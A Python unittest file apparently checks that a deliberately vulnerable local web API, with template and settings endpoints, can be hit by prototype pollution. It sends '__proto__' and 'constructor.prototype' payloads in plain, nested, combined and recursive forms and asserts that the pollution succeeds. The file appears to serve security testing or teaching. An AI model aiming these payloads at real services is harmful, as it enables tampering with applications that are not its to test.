import unittest
import requests
import os
import json
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configuration
API_URL = os.getenv('API_URL', 'http://localhost:3001')
TEMPLATE_ENDPOINT = f"{API_URL}/api/template"
SETTINGS_ENDPOINT = f"{API_URL}/api/settings"

class PrototypePollutionTest(unittest.TestCase):
    """Test cases for prototype pollution vulnerabilities."""

    def setUp(self):
        """Set up test environment."""
        # Reset settings before each test
        requests.post(f"{SETTINGS_ENDPOINT}/reset")

    def test_01_template_basic(self):
        """Test basic template functionality."""
        response = requests.post(f"{TEMPLATE_ENDPOINT}", json={
            'name': 'Test Template',
            'properties': {
                'header': 'Custom Header',
                'footer': 'Custom Footer'
            }
        })
        self.assertEqual(response.status_code, 200)
        self.assertIn('header', response.json())
        self.assertEqual(response.json()['header'], 'Custom Header')

    def test_02_settings_basic(self):
        """Test basic settings functionality."""
        response = requests.post(f"{SETTINGS_ENDPOINT}/update", json={
            'dateFormat': 'MM/DD/YYYY',
            'currency': 'USD'
        })
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json()['dateFormat'], 'MM/DD/YYYY')

    def test_03_basic_pollution(self):
        """Test basic prototype pollution."""
        # Attempt to pollute Object.prototype
        response = requests.post(f"{TEMPLATE_ENDPOINT}", json={
            'name': 'Malicious Template',
            '__proto__': {
                'polluted': 'Yes'
            }
        })
        self.assertEqual(response.status_code, 200)

        # Verify pollution
        verify = requests.get(f"{TEMPLATE_ENDPOINT}/settings")
        self.assertIn('polluted', verify.json())
        self.assertEqual(verify.json()['polluted'], 'Yes')

    def test_04_nested_pollution(self):
        """Test nested prototype pollution."""
        response = requests.post(f"{SETTINGS_ENDPOINT}/update", json={
            'display': {
                '__proto__': {
                    'polluted': 'Nested'
                }
            }
        })
        self.assertEqual(response.status_code, 200)

        # Verify nested pollution
        verify = requests.get(f"{SETTINGS_ENDPOINT}/all")
        self.assertIn('polluted', verify.json())
        self.assertEqual(verify.json()['polluted'], 'Nested')

    def test_05_constructor_pollution(self):
        """Test constructor prototype pollution."""
        response = requests.post(f"{TEMPLATE_ENDPOINT}", json={
            'name': 'Constructor Attack',
            'constructor': {
                'prototype': {
                    'polluted': 'Constructor'
                }
            }
        })
        self.assertEqual(response.status_code, 200)

        # Verify constructor pollution
        verify = requests.get(f"{TEMPLATE_ENDPOINT}/settings")
        self.assertIn('polluted', verify.json())
        self.assertEqual(verify.json()['polluted'], 'Constructor')

    def test_06_multiple_vectors(self):
        """Test multiple pollution vectors."""
        payload = {
            '__proto__': {'vector1': 'test1'},
            'constructor': {
                'prototype': {'vector2': 'test2'}
            },
            'nested': {
                '__proto__': {'vector3': 'test3'}
            }
        }
        response = requests.post(f"{SETTINGS_ENDPOINT}/update", json=payload)
        self.assertEqual(response.status_code, 200)

        # Verify all vectors
        verify = requests.get(f"{SETTINGS_ENDPOINT}/all")
        self.assertTrue(all(k in verify.json() for k in ['vector1', 'vector2', 'vector3']))

    def test_07_recursive_pollution(self):
        """Test recursive prototype pollution."""
        payload = {
            'a': {
                'b': {
                    'c': {
                        '__proto__': {
                            'deep': 'recursion'
                        }
                    }
                }
            }
        }
        response = requests.post(f"{TEMPLATE_ENDPOINT}", json={
            'name': 'Recursive Attack',
            'properties': payload
        })
        self.assertEqual(response.status_code, 200)

        # Verify deep pollution
        verify = requests.get(f"{TEMPLATE_ENDPOINT}/settings")
        self.assertIn('deep', verify.json())
        self.assertEqual(verify.json()['deep'], 'recursion')

def main():
    unittest.main(verbosity=2)

if __name__ == '__main__':
    main() 